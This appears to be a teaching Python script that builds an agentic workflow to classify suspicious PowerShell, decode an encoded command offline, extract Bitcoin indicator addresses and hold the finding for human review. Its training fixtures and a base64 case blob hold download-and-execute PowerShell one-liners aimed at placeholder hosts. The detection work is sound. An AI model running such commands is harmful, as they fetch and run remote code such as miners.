## Cryptocurrency Investigation with Agentic AI, Victor Fang, 2026

from __future__ import annotations

import base64
import hashlib
import math
import re
from collections import Counter
from operator import add
from typing import Annotated, Any, Literal, TypedDict

from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command, interrupt
from sklearn.ensemble import GradientBoostingClassifier


# Fixed, readable examples keep the lesson focused on the workflow. They are
# teaching fixtures, not a benchmark or a production malware corpus.
TRAINING_SAMPLES: tuple[tuple[str, int], ...] = (
    ("Get-Service | Where-Object Status -eq 'Running'", 0),
    ("Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", 0),
    ("Get-ChildItem C:\\Logs -Filter *.log | Measure-Object", 0),
    ("Write-Output 'Nightly backup complete'", 0),
    ("Test-NetConnection intranet.invalid -Port 443", 0),
    ("Get-CimInstance Win32_OperatingSystem | Select-Object Caption", 0),
    ("powershell.exe -NoProfile -File C:\\Ops\\inventory.ps1", 0),
    ("Install-Package Contoso.Agent -Source \\\\dist\\packages", 0),
    ("IEX ((New-Object Net.WebClient).DownloadString('https://stage.invalid/a'))", 1),
    ("powershell -NoProfile -W Hidden -Exec Bypass -Command IEX('test')", 1),
    ("powershell -NoProfile -EncodedCommand SQBFAFgAIAAoACcAdABlAHMAdAAnACkA", 1),
    ("$u='https://'+'stage.invalid/b'; IEX (New-Object Net.WebClient).DownloadString($u)", 1),
    ("I`E`X (N`ew-Ob`ject Ne`t.WebC`lient).Downl`oadStr`ing('https://stage.invalid/c')", 1),
    ("powershell -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-Expression 'x'", 1),
    ("Invoke-WebRequest https://stage.invalid/miner.bin -OutFile $env:TEMP\\m.exe; Start-Process $env:TEMP\\m.exe", 1),
    ("[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)) | IEX", 1),
)

FEATURE_NAMES = (
    "length",
    "entropy",
    "encoded",
    "hidden",
    "bypass",
    "invoke_expression",
    "download",
    "url",
    "admin_cmdlets",
    "concatenation",
)

REVIEW_THRESHOLD = 0.42
BTC_LEGACY_RE = re.compile(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b")
FORBIDDEN_OWNERSHIP_PATTERNS = (
    "owned by",
    "belongs to",
    "controlled by",
    "stolen by",
)
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


class CaseState(TypedDict, total=False):
    case_id: str
    powershell_text: str
    payload_text: str
    source_records: list[dict[str, str]]
    artifact_hash: str
    decoded_text: str
    decode_error: str | None
    feature_vector: dict[str, float]
    malicious_score: float
    review_action: Literal["review", "no_action"]
    wallet_iocs: list[str]
    finding: str
    validation_errors: list[str]
    review_decision: str
    status: str
    audit_log: Annotated[list[str], add]


def shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    counts = Counter(text)
    length = len(text)
    return -sum((count / length) * math.log2(count / length) for count in counts.values())


def decode_encoded_command(text: str) -> tuple[str, str | None]:
    """Decode a PowerShell -EncodedCommand as UTF-16LE without executing it."""
    match = re.search(
        r"(?i)-(?:encodedcommand|enc|ec)\s+([A-Za-z0-9+/=]{12,})",
        text,
    )
    if not match:
        return "", None

    try:
        raw = base64.b64decode(match.group(1), validate=True)
        return raw.decode("utf-16le"), None
    except (ValueError, UnicodeDecodeError) as exc:
        return "", f"decode failed: {exc}"


def extract_features(text: str) -> dict[str, float]:
    lower = text.lower()
    admin_terms = (
        "get-service",
        "get-process",
        "get-childitem",
        "write-output",
        "test-netconnection",
        "get-ciminstance",
        "install-package",
    )
    return {
        "length": float(len(text)),
        "entropy": shannon_entropy(text),
        "encoded": float(bool(re.search(r"(?i)-(?:encodedcommand|enc|ec)\b", text))),
        "hidden": float("hidden" in lower or "-w " in lower),
        "bypass": float("bypass" in lower or "-exec " in lower),
        "invoke_expression": float("invoke-expression" in lower or "iex" in lower.replace("`", "")),
        "download": float(
            any(term in lower.replace("`", "") for term in ("downloadstring", "invoke-webrequest", "start-process"))
        ),
        "url": float(bool(re.search(r"https?://", text, flags=re.I))),
        "admin_cmdlets": float(sum(lower.count(term) for term in admin_terms)),
        "concatenation": float(text.count("+") + text.count("`") + lower.count("-join")),
    }


def to_vector(features: dict[str, float]) -> list[float]:
    return [features[name] for name in FEATURE_NAMES]


def train_toy_model() -> GradientBoostingClassifier:
    """Fit one compact classifier from fixed teaching examples."""
    rows = [to_vector(extract_features(text)) for text, _ in TRAINING_SAMPLES]
    labels = [label for _, label in TRAINING_SAMPLES]
    model = GradientBoostingClassifier(
        n_estimators=40,
        learning_rate=0.08,
        max_depth=2,
        random_state=20260901,
    )
    model.fit(rows, labels)
    return model


MODEL = train_toy_model()


def base58check_is_valid(value: str) -> bool:
    """Validate a legacy Bitcoin Base58Check string."""
    try:
        number = 0
        for character in value:
            number = number * 58 + BASE58_ALPHABET.index(character)
    except ValueError:
        return False

    leading_zeroes = len(value) - len(value.lstrip("1"))
    body = number.to_bytes(max(1, (number.bit_length() + 7) // 8), "big")
    decoded = b"\x00" * leading_zeroes + body
    if len(decoded) < 5:
        return False

    payload, checksum = decoded[:-4], decoded[-4:]
    expected = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return checksum == expected


def preserve_and_decode(state: CaseState) -> dict[str, Any]:
    original = state["powershell_text"]
    decoded, error = decode_encoded_command(original)
    return {
        "artifact_hash": hashlib.sha256(original.encode("utf-8")).hexdigest(),
        "decoded_text": decoded,
        "decode_error": error,
        "audit_log": ["preserved PowerShell text and attempted offline decoding"],
    }


def classify_powershell(state: CaseState) -> dict[str, Any]:
    # Include decoded content because the model should inspect the letter, not
    # only its encoded envelope.
    combined = state["powershell_text"] + "\n" + state.get("decoded_text", "")
    features = extract_features(combined)
    score = float(MODEL.predict_proba([to_vector(features)])[0, 1])
    action: Literal["review", "no_action"] = (
        "review" if score >= REVIEW_THRESHOLD else "no_action"
    )
    return {
        "feature_vector": features,
        "malicious_score": round(score, 4),
        "review_action": action,
        "audit_log": [f"classified artifact at {score:.4f}; action={action}"],
    }


def route_after_classification(state: CaseState) -> Literal["extract_iocs", "close"]:
    return "extract_iocs" if state["review_action"] == "review" else "close"


def extract_wallet_iocs(state: CaseState) -> dict[str, Any]:
    """Extract only checksum-valid legacy Bitcoin addresses from the payload."""
    candidates = BTC_LEGACY_RE.findall(state.get("payload_text", ""))
    validated = sorted({value for value in candidates if base58check_is_valid(value)})
    return {
        "wallet_iocs": validated,
        "audit_log": [f"validated {len(validated)} Bitcoin IOC candidate(s)"],
    }


def build_finding(state: CaseState) -> dict[str, Any]:
    score = state["malicious_score"]
    wallets = state.get("wallet_iocs", [])
    wallet_text = ", ".join(wallets) if wallets else "none"
    finding = (
        f"Artifact {state['case_id']} scored {score:.4f} against the "
        f"{REVIEW_THRESHOLD:.2f} PowerShell review threshold. "
        f"The separately preserved payload contained these checksum-valid "
        f"Bitcoin IOC candidates: {wallet_text}. The controller and ownership "
        f"of every address remain unknown pending independent evidence."
    )
    return {
        "finding": finding,
        "audit_log": ["drafted an evidence-bounded finding"],
    }


def validate_finding(state: CaseState) -> dict[str, Any]:
    finding = state["finding"]
    lowered = finding.lower()
    errors: list[str] = []

    for phrase in FORBIDDEN_OWNERSHIP_PATTERNS:
        if phrase in lowered:
            errors.append(f"unsupported ownership language: {phrase!r}")

    for wallet in state.get("wallet_iocs", []):
        if wallet not in finding:
            errors.append(f"validated IOC missing from finding: {wallet}")

    if f"{state['malicious_score']:.4f}" not in finding:
        errors.append("classifier score is not grounded in the draft")

    if "unknown" not in lowered:
        errors.append("finding must preserve the ownership/controller unknown")

    return {
        "validation_errors": errors,
        "audit_log": [f"validated draft; errors={len(errors)}"],
    }


def route_after_validation(state: CaseState) -> Literal["review", "blocked"]:
    return "blocked" if state.get("validation_errors") else "review"


def human_review(state: CaseState) -> dict[str, Any]:
    decision = interrupt(
        {
            "case_id": state["case_id"],
            "finding": state["finding"],
            "score": state["malicious_score"],
            "wallet_iocs": state.get("wallet_iocs", []),
            "question": "Approve, reject, or request more evidence?",
        }
    )
    if isinstance(decision, dict):
        reviewer = str(decision.get("reviewer", "unknown-reviewer"))
        action = str(decision.get("decision", "request-more-evidence"))
    else:
        reviewer = "unknown-reviewer"
        action = str(decision)
    return {
        "review_decision": action,
        "audit_log": [f"human review by {reviewer}: {action}"],
    }


def finalize(state: CaseState) -> dict[str, Any]:
    return {
        "status": f"completed:{state['review_decision']}",
        "audit_log": ["workflow finalized after human decision"],
    }


def close_no_action(state: CaseState) -> dict[str, Any]:
    return {
        "status": "closed:no_action",
        "audit_log": ["closed below-threshold item; retain sampling policy"],
    }


def blocked(state: CaseState) -> dict[str, Any]:
    return {
        "status": "blocked:validation_error",
        "audit_log": ["withheld unsupported draft"],
    }


def build_graph():
    graph = StateGraph(CaseState)
    graph.add_node("preserve_decode", preserve_and_decode)
    graph.add_node("classify", classify_powershell)
    graph.add_node("extract_iocs", extract_wallet_iocs)
    graph.add_node("draft", build_finding)
    graph.add_node("validate", validate_finding)
    graph.add_node("human_review", human_review)
    graph.add_node("finalize", finalize)
    graph.add_node("close", close_no_action)
    graph.add_node("blocked", blocked)

    graph.add_edge(START, "preserve_decode")
    graph.add_edge("preserve_decode", "classify")
    graph.add_conditional_edges(
        "classify",
        route_after_classification,
        {"extract_iocs": "extract_iocs", "close": "close"},
    )
    graph.add_edge("extract_iocs", "draft")
    graph.add_edge("draft", "validate")
    graph.add_conditional_edges(
        "validate",
        route_after_validation,
        {"review": "human_review", "blocked": "blocked"},
    )
    graph.add_edge("human_review", "finalize")
    graph.add_edge("finalize", END)
    graph.add_edge("close", END)
    graph.add_edge("blocked", END)

    return graph.compile(checkpointer=InMemorySaver())


APP = build_graph()

CRYPTOMINER_BLOB = (
    "SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIA"
    "QwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcA"
    "aAB0AHQAcAA6AC8ALwBjAHIAeQBwAHQAbwBtAGkAbgBlAHIALQBjADIALgBpAG4A"
    "dgBhAGwAaQBkADoAOAAyADIAMAAvAGkAbgBzAHQAYQBsAGwALgBwAHMAMQAnACkA"
    "KQA="
)

CASE: CaseState = {
    "case_id": "PS-0416",
    "powershell_text": (
        "powershell.exe -NoProfile -NonI -W Hidden -Exec Bypass "
        f"-EncodedCommand {CRYPTOMINER_BLOB}"
    ),
    # This is a separate, preserved payload fixture based on the public Talos
    # reporting. The wallet was not inside the first PowerShell command.
    "payload_text": "clipper_config btc=3Csd9Zq4r16dVQuREs52y5eJFgYEqQjAx1",
    "source_records": [
        {"evidence_id": "PS-0416", "kind": "powershell_script_block"},
        {"evidence_id": "PAYLOAD-0001", "kind": "clipboard_stealer_fixture"},
    ],
    "audit_log": [],
}


if __name__ == "__main__":
    config = {"configurable": {"thread_id": "case-PS-0416"}}

    paused = APP.invoke(CASE, config=config)
    print("First invocation status:", paused.get("status", "interrupted"))
    print("Score:", paused.get("malicious_score"))
    print("Bitcoin IOCs:", paused.get("wallet_iocs"))
    print("Finding:", paused.get("finding"))

    # The surrounding application must authenticate and authorize the reviewer
    # before resuming this same thread.
    completed = APP.invoke(
        Command(resume={"decision": "approve", "reviewer": "alice"}),
        config=config,
    )
    print("Final status:", completed["status"])
